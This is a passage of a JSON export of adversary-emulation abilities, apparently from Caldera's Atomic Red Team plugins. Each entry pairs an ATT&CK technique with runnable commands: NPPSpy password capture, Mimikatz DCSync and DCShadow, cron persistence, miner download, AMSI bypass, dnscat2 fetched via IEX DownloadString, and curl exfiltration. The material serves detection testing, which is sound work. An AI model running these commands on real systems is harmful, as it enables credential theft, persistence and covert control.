"1f0614ea5c4af6faf1b44570f5f22f8a", "technique_id": "T1036.004", "tactic": "defense-evasion", "requirements": [], "name": "Creating W32Time similar named service using sc", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["schtasks /tn win32times /delete /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f && schtasks /query /tn win32times", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Masquerading: Masquerade Task or Service", "ability_id": "7de3d7b4922a7b996d8df36fb22bb118", "technique_id": "T1036.004", "tactic": "defense-evasion", "requirements": [], "name": "Creating W32Time similar named service using schtasks", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $cleanupUpdatedValue = $cleanupPath.PROVIDERORDER ; $cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''; Set-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue; Remove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore; Remove-Item C:\\NPPSpy.txt -ErrorAction Ignore; Remove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item \"$env:Temp\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"; $path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"; Set-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore; echo \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping", "ability_id": "44df0e5fd9ba43087400e0348aa5ac1c", "technique_id": "T1003", "tactic": "credential-access", "requirements": [], "name": "Credential Dumping with NPPSpy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for possible credentials stored in Registry", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg query HKCU /f password /t REG_SZ /s", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials in Registry", "ability_id": "3aad5312-d48b-4206-9de4-39866c12e60f", "technique_id": "T1552.002", "tactic": "credential-access", "requirements": [], "name": "Credentials in Registry - HKCU", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for possible credentials stored in the HKLM Hive", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg query HKLM /f password /t REG_SZ /s", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials in Registry", "ability_id": "98e58fc4-3843-4511-89b1-50cb872e0c9b", "technique_id": "T1552.002", "tactic": "credential-access", "requirements": [], "name": "Credentials in Registry - HKLM", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /var/spool/cron/crontabs/persistevil"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" >> /var/spool/cron/crontabs/persistevil", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Cron", "ability_id": "4c1562d00577b20d261d16ac889434bd", "technique_id": "T1053.003", "tactic": "multiple", "requirements": [], "name": "Cron - Add script to /var/spool/cron/crontabs/ folder", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /etc/cron.daily/persistevil; rm /etc/cron.hourly/persistevil; rm /etc/cron.monthly/persistevil; rm /etc/cron.weekly/persistevil"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /etc/cron.daily/persistevil; rm /etc/cron.hourly/persistevil; rm /etc/cron.monthly/persistevil; rm /etc/cron.weekly/persistevil"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Cron", "ability_id": "d9a63c6a2dac4621d430d0570c995a09", "technique_id": "T1053.003", "tactic": "multiple", "requirements": [], "name": "Cron - Add script to all cron subfolders", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["crontab /tmp/notevil"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["crontab /tmp/notevil"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Cron", "ability_id": "074cad3a55b99b8e434702ffcf44f4d1", "technique_id": "T1053.003", "tactic": "multiple", "requirements": [], "name": "Cron - Replace crontab with referenced file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download and execute Monero miner (xmrig) for 1 minute", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf ./xmrig*;"], "code": null, "timeout": 120, "build_target": null, "platform": "linux", "command": "wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;\ntar -xf xmrig-6.11.2-linux-x64.tar.gz;\ntimeout 60 ./xmrig-6.11.2/xmrig;\n[ $? -eq 124 ]", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf ./xmrig*;"], "code": null, "timeout": 120, "build_target": null, "platform": "darwin", "command": "curl -OL https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-macos-x64.tar.gz;\ntar -xf xmrig-6.11.2-macos-x64.tar.gz;\nscreen -S miner -dm ./xmrig-6.11.2/xmrig;\nsleep 60s;\nkillall xmrig;\nscreen -S miner -X quit", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm ./xmrig* -r -fo;"], "code": null, "timeout": 120, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;\nExpand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\\;\nStart-Process \".\\xmrig-6.11.2\\xmrig.exe\" -WindowStyle Hidden;\nStart-Sleep -Seconds 60;\nStop-Process -Name \"xmrig\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Resource Hijacking", "ability_id": "46da2385-cf37-49cb-ba4b-a739c7a19de4", "technique_id": "T1496", "tactic": "impact", "requirements": [{"relationship_match": [{"source": "no.logs"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "fw.disabled"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Crypto (Monero) Mining", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1 && del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1 && del c:\\programdata\\allthethingsx64.dll >nul 2>&1 && del %Temp%\\allthethingsx64.dll >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "04d923d1b722004f912afca5635cd518", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Curl Download File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "f8beff0e35ecdb7cfea66d289bc77b5a", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Curl Upload File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Obtain user from current session", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "whoami", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "whoami", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "whoami", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "bd527b63-9f9e-46e0-9816-b8434d2b8989", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "Current User", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$dc_output_file = \"$env:TEMP\\art-T1207-mimikatz-DC.log\"; Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"; $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam\"; Start-Sleep -Seconds 5; &; Write-Host \"`nWaiting for fake DC server to return\"; Wait-Process $dc; Write-Host \"`nOutput from fake DC server:\"; Get-Content $dc_output_file; Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host \"End of DCShadow\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Rogue Domain Controller", "ability_id": "db2ffa8a52a76704b0cf6944e8383b36", "technique_id": "T1207", "tactic": "defense-evasion", "requirements": [], "name": "DCShadow (Active Directory)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%\" \"exit\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: DCSync", "ability_id": "31cf0ec60219bc8a36865f2eaddf1fbd", "technique_id": "T1003.006", "tactic": "credential-access", "requirements": [], "name": "DCSync (Active Directory)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %APPDATA%\\updater.exe >nul 2>&1 && del %APPDATA%\\amsi.dll >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe && copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll && %APPDATA%\\updater.exe -Command exit", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking", "ability_id": "63bbedafba2f541552ac3579e9e3737b", "technique_id": "T1574.001", "tactic": "multiple", "requirements": [], "name": "DLL Search Order Hijacking - amsi.dll", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["67baa5_GUP.exe"], "parsers": [], "cleanup": ["taskkill /F /IM calculator.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "67baa5_GUP.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: DLL Side-Loading", "ability_id": "db9cadf506caece270e0cf2aeff67693", "technique_id": "T1574.002", "tactic": "multiple", "requirements": [], "name": "DLL Side-Loading using the Notepad++ GUP.exe binary", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["80410d_preloader.dll"], "parsers": [], "cleanup": ["taskkill /F /IM calculator.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "set DOTNET_STARTUP_HOOKS=80410d_preloader.dll && dotnet -h > nul && echo.", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: DLL Side-Loading", "ability_id": "c3b299c5e0884f167a3c2c2be447067c", "technique_id": "T1574.002", "tactic": "multiple", "requirements": [], "name": "DLL Side-Loading using the dotnet startup hook environment variable", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["9070cd_T1027-cc-macro.xlsm"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body 9070cd_T1027-cc-macro.xlsm", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information", "ability_id": "290cb263b74af11c6be2e7345072f05b", "technique_id": "T1027", "tactic": "defense-evasion", "requirements": [], "name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Send-MailMessage -From", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information", "ability_id": "98ada74a54f1ac18e4201c372c0ef8ad", "technique_id": "T1027", "tactic": "defense-evasion", "requirements": [], "name": "DLP Evasion via Sensitive Data in VBA Macro over email", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Application Layer Protocol: DNS", "ability_id": "bda00f459bb9118c4c88de426055e180", "technique_id": "T1071.004", "tactic": "command-and-control", "requirements": [], "name": "DNS C2", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \"TXT\" \"atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io\" -QuickTimeout}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Application Layer Protocol: DNS", "ability_id": "920b95f39d124c8a9e7342d88bd54516", "technique_id": "T1071.004", "tactic": "command-and-control", "requirements": [], "name": "DNS Large Query Volume", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-Location PathToAtomicsFolder; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Application Layer Protocol: DNS", "ability_id": "d9acc651d3e778f0c04700a00f52d52c", "technique_id": "T1071.004", "tactic": "command-and-control", "requirements": [], "name": "DNS Long Domain Query", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-Location PathToAtomicsFolder; .\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Application Layer Protocol: DNS", "ability_id": "f58b975c94224c4d5f8a28c0744109c3", "technique_id": "T1071.004", "tactic": "command-and-control", "requirements": [], "name": "DNS Regular Beaconing", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain\ncontroller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.$env:USERDNSDOMAIN", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "7a5ceaef032a7b9696c9e032574e2476", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "DNS Server Discovery Using nslookup", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "for($i=0; $i -le", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Protocol Tunneling", "ability_id": "5863dfdd6b617307091ede1b808d061d", "technique_id": "T1572", "tactic": "command-and-control", "requirements": [], "name": "DNS over HTTPS Large Query Volume", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": 